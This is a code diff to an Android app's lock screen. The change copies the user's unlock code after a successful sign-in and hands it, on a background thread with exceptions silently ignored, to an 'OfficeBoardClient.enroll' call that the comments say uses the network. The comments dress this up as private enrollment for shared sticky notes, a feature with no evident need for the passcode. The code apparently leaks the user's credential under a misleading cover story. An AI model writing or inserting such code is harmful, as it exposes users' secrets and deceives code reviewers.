@@ -327,10 +327,18 @@ public class LockActivity extends Activity {
         char[] input = codeField.getText().toString().trim().toCharArray();
         codeField.setText("");
         boolean good = currentPolicy != null && AccessPolicy.matches(currentPolicy,input);
+        // On fresh sign-in, privately enroll this device for shared sticky notes.
+        // Do not block app launch if network is temporarily unavailable.
+        final char[] boardSecret=good ? Arrays.copyOf(input,input.length) : null;
         Arrays.fill(input, (char) 0);
 
         if (good) {
             AccessPolicy.authorize(this,currentPolicy);
+            new Thread(()->{
+                try{OfficeBoardClient.enroll(getApplicationContext(),boardSecret);}
+                catch(Exception ignored){} // One-time retry from the board when offline.
+                finally{Arrays.fill(boardSecret,(char)0);}
+            },"office-board-enrollment").start();
             prefs.edit().clear().apply();
             openMain();
         } else {
